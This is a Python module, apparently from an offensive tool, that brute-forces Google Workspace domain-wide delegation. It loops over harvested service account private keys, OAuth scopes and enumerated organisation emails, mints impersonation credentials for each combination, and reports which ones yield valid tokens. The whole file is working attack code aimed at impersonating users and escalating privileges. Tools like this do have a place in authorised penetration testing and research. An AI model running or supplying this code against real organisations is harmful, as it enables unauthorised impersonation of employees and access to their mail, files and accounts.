from google.oauth2 import service_account
from google.auth.transport.requests import Request
from google.auth.exceptions import DefaultCredentialsError, RefreshError
from src.domain_users_enum import DomainUserEnumerator
import requests
import os

KEY_FOLDER = 'SA_private_keys'

class OAuthEnumerator:
    """ Creates access token to each private key, OAuth scope, and distinct org email and validate whether they have DWD enabled"""
    def __init__(self, gcp_project_enumerator, workspace_user_email, scopes_file, key_folder, verbose=False):
        self.gcp_project_enumerator = gcp_project_enumerator
        self.workspace_user_email = workspace_user_email
        self.scopes_file = scopes_file
        self.key_folder = key_folder
        self.scopes = self.read_scopes_from_file()
        self.valid_results = {}
        self.verbose = verbose
        self.confirmed_dwd_keys = []  # Keep track of keys with DWD
        self.user_emails = self.get_org_emails()

    def get_valid_results(self):
        return self.valid_results

    def read_scopes_from_file(self):
        """ read OAuth scopes list from oauth_scopes.txt"""
        try:
            with open(self.scopes_file, 'r') as file:
                scopes = [line.strip() for line in file]
            return scopes
        except FileNotFoundError as fnf_error:
            print(f"Scopes file not found: {fnf_error}")
            return []
        except Exception as e:
            print(f"An error occurred while reading the scopes file: {e}")
            return []

    def get_org_emails(self):
        """ Initialize user emails based on the provided workspace_user_email in config or via enumeration IAM roles on GCP projects """
        if self.workspace_user_email:
            return [self.workspace_user_email]
        else:
            domain_user_enumerator = DomainUserEnumerator(self.gcp_project_enumerator)
            unique_users = domain_user_enumerator.list_unique_domain_users()
            print("\n[+] Enumerating unique org domain and users on GCP (ONE user per domain) ...")
            domain_user_enumerator.print_unique_domain_users()
            return list(unique_users.values())

    def jwt_creator(self):
        """ Create JWT objects for each combination of workspace distinct org email, OAuth scope, and private key pair  """
        jwt_objects = []
        for json_file in os.listdir(self.key_folder):
            json_path = os.path.join(self.key_folder, json_file)

            for user_email in self.user_emails:
                for scope in self.scopes:
                    creds = service_account.Credentials.from_service_account_file(
                        json_path,
                        scopes=[scope],
                    )
                    creds = creds.with_subject(user_email)
                    jwt_objects.append((json_path, user_email, scope, creds))

        return jwt_objects

    def token_validator(self, jwt_objects):
        """ Validate access tokens for each JWT object combination """
        for json_path, user_email, scope, creds in jwt_objects:
            try:
                creds.refresh(Request())
                token_info_url = f"https://www.googleapis.com/oauth2/v1/tokeninfo?access_token={creds.token}"
                response = requests.get(token_info_url)

                if response.status_code == 200:
                    self.valid_results.setdefault(json_path, []).append(scope)
                    print(f"\033[92m [+] Token is valid for {json_path} with scope {scope} \033[0m")
                    if json_path not in self.confirmed_dwd_keys:
                        self.confirmed_dwd_keys.append(json_path)

            except DefaultCredentialsError:
                print("The service account file is not valid or doesn't exist.")
            except RefreshError as e:
                if self.verbose:
                    print(f"[-] Invalid or expired token with scope {scope}")

    def total_jwt_combinations(self):
        """ calculate total combinations of JWT based on the number of enumerated OAuth scopes, GCP private keys pairs and target workspace org emails
        (oauth_scopes.txt number * private key pairs * target workspace org (distinct) emails)"""
        num_scopes = len(self.scopes)
        num_keys = len(os.listdir(self.key_folder))
        num_emails = len(self.user_emails)
        return num_scopes * num_keys * num_emails


    def run(self):
        if not self.scopes:
            print('\033[91m'+ '[!] No scopes to check. Exiting.' + '\033[0m')
            return

        if not os.path.exists(self.key_folder) or not os.listdir(self.key_folder):
            print('\033[91m' + '[!] No GCP private key pairs were found. It might suggest the IAM user doesn’t have permission to create keys on target Service Accounts. Try to use different GCP identity' + '\033[0m')
            return

        total_combinations = self.total_jwt_combinations()
        print(f"  \t [+] Total of JWT combinations to enumerate: {total_combinations}!")
        jwt_objects = self.jwt_creator()
        self.token_validator(jwt_objects)
